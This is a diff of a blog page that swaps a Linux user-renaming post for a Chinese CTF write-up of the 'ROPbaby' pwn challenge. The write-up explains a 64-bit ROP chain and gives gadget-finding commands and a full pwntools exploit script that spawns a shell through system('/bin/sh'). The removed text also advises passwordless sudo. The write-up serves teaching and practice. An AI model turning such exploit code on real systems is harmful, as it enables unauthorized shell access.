@@ -10,7 +10,7 @@
     <meta name="keywords"  content=" LISTONE的博客, LISTONE, listone, python, c, 网络安全">
     <meta name="theme-color" content="#000000">
     
-    <title>linux更改用户名以及sudo用户小技巧 - LISTONE的博客 | Listone Blog</title>
+    <title>实验吧ROPbaby(PWN) - LISTONE的博客 | Listone Blog</title>
 
     <!-- Web App Manifest -->
     <link rel="manifest" href="/pwa/manifest.json">
@@ -22,7 +22,7 @@
     <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
     
     <!-- Canonical URL -->
-    <link rel="canonical" href="http://localhost:4000/2019/07/15/linux%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E4%BB%A5%E5%8F%8Asudo%E7%94%A8%E6%88%B7%E5%B0%8F%E6%8A%80%E5%B7%A7/">
+    <link rel="canonical" href="http://localhost:4000/2019/07/26/%E5%AE%9E%E9%AA%8C%E5%90%A7ROPbaby(PWN)/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -178,12 +178,12 @@
                         <a class="tag" href="/tags/#Notes" title="Notes">Notes</a>
                         
                     </div>
-                    <h1>linux更改用户名以及sudo用户小技巧</h1>
+                    <h1>实验吧ROPbaby(PWN)</h1>
                     
                     
-                    <h2 class="subheading">修改linux用户名并修改用户目录名以及sudo用户小技巧</h2>
+                    <h2 class="subheading">一道简单的ROP手法的PWN题</h2>
                     
-                    <span class="meta">Posted by LISTONE on July 15, 2019</span>
+                    <span class="meta">Posted by LISTONE on July 26, 2019</span>
                 </div>
             </div>
         </div>
@@ -205,52 +205,93 @@
   <p>本文首发于博主公众号LISTONE，欢迎关注哦！</p>
 </blockquote>
 
-<h2 id="前言">前言</h2>
-<p>  <strong>一、</strong> 历时几天，终于下完了一个3.4G大小的一个ubuntu虚拟机压缩包（百度云限速，本人穷，买不起会员。。。），这个虚拟机是前人搭建好的一个pwn做题环境，它的默认名字是他平时的代号，这个就让我很不舒服了，虽然是现成的，但谁不想看着自己的名字不是，所以一气之下，决定删除用户，但是转念一想，他就是在这个用户下配置的环境，我删了，那配的环境不也就没有了，所以我就想着改一下用户名，在这期间有很多要改的地方，如果不小心操作错误，很有可能会无法登录系统，所以我在这里记录一下我的解决方法，免得以后踩坑。。。<br />
-  <strong>二、</strong> 我的主机操作系统被我换成kali了，当初想着root用户不安全，遂建立了一个普通用户，可是建立普通用户之后也发现，坑！太坑了！不输入sudo执行命令，很多命令都执行不了，而每次执行sudo命令时，都要输入当前用户密码，这就让我特别难受了。自认为密码长了就会安全，所以我给普通用户设置了一个15位长的密码，这每次执行命令的时候输一遍，谁顶得住，太麻烦了呀，于是想办法解决，功夫不负有心人，这个方法被我找到了，哈哈哈。。。
-  行，闲话扯皮完毕，下面进入正题。。。</p>
+<p>题目链接：<a href="http://www.shiyanbar.com/ctf/2028">ROPbaby</a>
+（没想到题目服务器挂掉了，只能本地做了）</p>
 
-<h2 id="linux更改用户名">linux更改用户名</h2>
-<h3 id="一修改sudoer文件">（一）修改sudoer文件</h3>
-<p>  我们为自己要改的名字提前赋予较高的权限，防止修改下面文件的过程中出现权限不足。（注：之前这个ubuntu用户名不是listone，我平时自己的代号是listone，所以我已经改过来了，当时修改的时候没有截图，那我就假设有一个aaa用户，我要将aaa用户名改为listone用户名）
-<img src="http://wx1.sinaimg.cn/large/007cEDWily1g50kqajt7uj30bl01mjrb.jpg" alt="" />
-<img src="http://wx3.sinaimg.cn/large/007cEDWily1g50kpo69n7j30ak027glu.jpg" alt="" /></p>
+<p>这个题目给了我们两个文件一个ROPbaby，一个libc。</p>
 
-<h3 id="二修改shadow文件">（二）修改shadow文件</h3>
-<p>  这个文件中存储与登陆有关的内容格式如下：</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: passwd: lastchg: min: max: warn: inactive: expire: flag   
-登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志
+<p>首先查看ropbaby的文件信息和保护方式。</p>
+
+<p>在这里可以看到程序开启了NX，这样的话shellcode的方式就很难用了，因此我们用ROP的方法来溢出攻击。</p>
+
+<p>ROP的思路就是通过返回导向式编程，劫持程序的返回地址，将其定位到目标位置，在CTF中，我们一般都是劫持程序运行<code class="highlighter-rouge">system('/bin/sh')</code>。</p>
+
+<p>这个程序通过上面的信息可以知道是64位的，在64位程序中，函数调用时，前六个参数是通过<code class="highlighter-rouge">rdi</code>、<code class="highlighter-rouge">rsi</code>、<code class="highlighter-rouge">rdx</code>、<code class="highlighter-rouge">rcx</code>、<code class="highlighter-rouge">r8</code>和<code class="highlighter-rouge">r9</code>来进行传递的，我们的目的是劫持程序执行<code class="highlighter-rouge">system('/bin/sh')</code>这个语句。</p>
+
+<p>因此，我们需要做的就是：</p>
+<ol>
+  <li>找到溢出点</li>
+  <li>构造gadget，包含<code class="highlighter-rouge">pop rdi | retn</code></li>
+  <li>在libc中找到<code class="highlighter-rouge">/bin/sh</code>字符串的地址，并送入<code class="highlighter-rouge">rdi</code>寄存器</li>
+  <li>找到<code class="highlighter-rouge">system</code>函数地址，并使程序跳转执行<code class="highlighter-rouge">system</code>函数</li>
+</ol>
+
+<p>通过题目中给出的libc文件，我们可以轻易地在终端中使用如下命令找到<code class="highlighter-rouge">pop rdi | retn</code>的地址</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --binary libc-2.23.so --only "pop|ret" |grep "pop rdi"
 </code></pre></div></div>
-<p><img src="http://wx2.sinaimg.cn/large/007cEDWily1g50kplsn5oj30au018dg1.jpg" alt="" />
-  我们需要将登录名更改：
-<img src="http://wx4.sinaimg.cn/large/007cEDWily1g50kpjko9vj30bs017wep.jpg" alt="" /></p>
+<p>结果如下：<br />
+<img src="http://wx2.sinaimg.cn/large/007cEDWily1g5dnsj933cj30gx02gmxx.jpg" alt="ROPgadget" /></p>
 
-<h3 id="三开始修改目录">（三）开始修改目录</h3>
-<p><img src="http://wx3.sinaimg.cn/large/007cEDWily1g50kph2bu6j30b101cjrb.jpg" alt="" />
-  用户开始目录中，包含用户相关配置信息，我们要将二者相匹配</p>
+<p>我们需要着重记住上面我框住的那个地址。</p>
 
-<h3 id="四修改passwd文件">（四）修改passwd文件</h3>
-<p><img src="http://wx3.sinaimg.cn/large/007cEDWily1g50kpe77llj30bm01gdfs.jpg" alt="" />
-  passwd文件内容格式如下：</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell
+<p>找溢出点：
+在程序中有一个<code class="highlighter-rouge">memcpy</code>函数如下：<br />
+<img src="http://wx2.sinaimg.cn/large/007cEDWily1g5dnslmgusj308301d745.jpg" alt="memcpy" /></p>
+
+<p>其中<code class="highlighter-rouge">savedergs</code>是以<code class="highlighter-rouge">int64</code>声明的，因此最多可输入8个字符，之后多输入就会溢出，这个地方就是我们要找的溢出点了。</p>
+
+<p>然后在libc中找到<code class="highlighter-rouge">/bin/sh</code>的地址，用下面的命令就可以：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings -tx libc-2.23.so|grep "/bin/sh"
 </code></pre></div></div>
-<p><img src="http://wx3.sinaimg.cn/large/007cEDWily1g50koxxp63j30c601maad.jpg" alt="" />
-  我们将用户名，以及主目录等等改为新的名字
-<img src="http://wx1.sinaimg.cn/large/007cEDWily1g50kpbx41rj30dx01bdg8.jpg" alt="" /></p>
-<h3 id="五如果还想修改原来用户下文件所属的组">（五）如果还想修改原来用户下文件所属的组：</h3>
-<p>  可以将 /etc/group 文件中的旧用户组，改为新的用户组</p>
-<h3 id="六最后再次进入etcsudoer-文件将就用户名aaa-删除">（六）最后，再次进入/etc/sudoer 文件，将就用户名aaa 删除</h3>
-<p><img src="http://wx1.sinaimg.cn/large/007cEDWily1g50kovmzzhj30b001r74g.jpg" alt="" />
-  最后，重启之后就可以看到用户名已经更改。</p>
+<p><img src="http://wx2.sinaimg.cn/large/007cEDWily1g5dnsp9s5mj30am0193yj.jpg" alt="/bin/sh" /></p>
 
-<h2 id="sudo用户小技巧">sudo用户小技巧</h2>
-<p>  使用sudo用户时，可以修改sudoer文件，认真的同学，应该在上面已经发现了技巧，现在，在这里重提一下。
-<img src="http://wx2.sinaimg.cn/large/007cEDWily1g50kopephcj309g01w74j.jpg" alt="" />
-  就是在listone用户那里，加一个NOPASSWD就行了，比起修改用户名来说，很简单了。</p>
+<p>在这个程序中可以直接查找<code class="highlighter-rouge">system</code>函数的地址，但是我们需要找到程序的基址，所以我们需要找到<code class="highlighter-rouge">system</code>的偏移地址。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> objdump -T libc-2.23.so|grep "system"
+</code></pre></div></div>
+<p><img src="http://wx3.sinaimg.cn/large/007cEDWily1g5dnssdtqnj30jp02ddh1.jpg" alt="objdump" />
+这里面0x45390就是<code class="highlighter-rouge">system</code>函数的地址</p>
 
-<h2 id="总结">总结</h2>
-<p>  linux零碎的知识很多，在学习过程中，记录是很重要的，以前学到的东西，因为没有记录，当要用到的时候又给忘掉了，还要重新找资料，所以不如我们平时学习的时候多记笔记，多反思。
-  嗯，就是这样，这次分享就到这里了。</p>
+<p>所以，我们可以写出利用脚本：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env/python
+# coding=utf-8  
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  
+<span class="c1">#context.log_level = "debug"  
+</span><span class="n">env</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span>  
+<span class="c1">#p = remote('106.2.25.7','8004')  
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ropbaby'</span><span class="p">)</span>  
+<span class="n">pop_rdi_ret_offset</span> <span class="o">=</span> <span class="mh">0x21102</span>  
+  
+<span class="n">str_bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x18cd17</span>  
+
+<span class="n">system_addr_offset</span> <span class="o">=</span> <span class="mh">0x45390</span>  
+  
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Enter symbol: '</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>  
+  
+<span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">15</span><span class="p">:],</span><span class="mi">16</span><span class="p">)</span>  
+<span class="k">print</span> <span class="s">'[+]system_addr: '</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>  
+
+<span class="n">base_addr</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">-</span> <span class="n">system_addr_offset</span>  
+  
+<span class="n">str_bin_sh_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">str_bin_sh_offset</span>  
+<span class="k">print</span> <span class="s">"[+]binsh: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">str_bin_sh_addr</span><span class="p">))</span>  
+<span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">pop_rdi_ret_offset</span>  
+  
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Enter bytes to send (max 1024): '</span><span class="p">)</span>  
+  
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">str_bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>  
+  
+<span class="c1"># p.sendline(str(len(payload)))  
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'32'</span><span class="p">)</span>  
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  
+  
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  
+</code></pre></div></div>
 
 
                 <hr style="visibility: hidden;">
@@ -258,19 +299,12 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/07/14/MSF%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%8F%8Anmap%E6%96%B0%E5%AD%A6%E7%94%A8%E6%B3%95/" data-toggle="tooltip" data-placement="top" title="MSF内网探测及nmap新学用法">
-                        Previous<br>
-                        <span>MSF内网探测及nmap新学用法</span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="next">
                         <a href="/2019/07/19/%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3TraceMe/" data-toggle="tooltip" data-placement="top" title="调试破解TraceMe">
-                        Next<br>
+                        Previous<br>
                         <span>调试破解TraceMe</span>
                         </a>
                     </li>
+                    
                     
                 </ul>
 
